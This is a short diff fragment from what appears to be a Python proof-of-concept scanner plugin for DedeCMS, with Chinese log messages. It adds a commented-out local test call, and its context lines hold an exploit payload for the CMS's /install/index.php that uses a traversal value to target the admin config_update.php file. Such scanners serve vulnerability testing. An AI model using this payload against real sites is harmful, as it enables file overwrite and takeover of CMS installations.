@@ -31,6 +31,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             
+            #audit(assign('dedecms', 'http://localhost:8080/DedeCMS-V5.7-UTF8-SP1-Full/uploads/')[1])
             hh = hackhttp.hackhttp()
             path = '/install/index.php'
             payload1 = '?step=11&insLockfile=utf-8&s_lang=urf-8&install_demo_name=../data/admin/config_update.php'
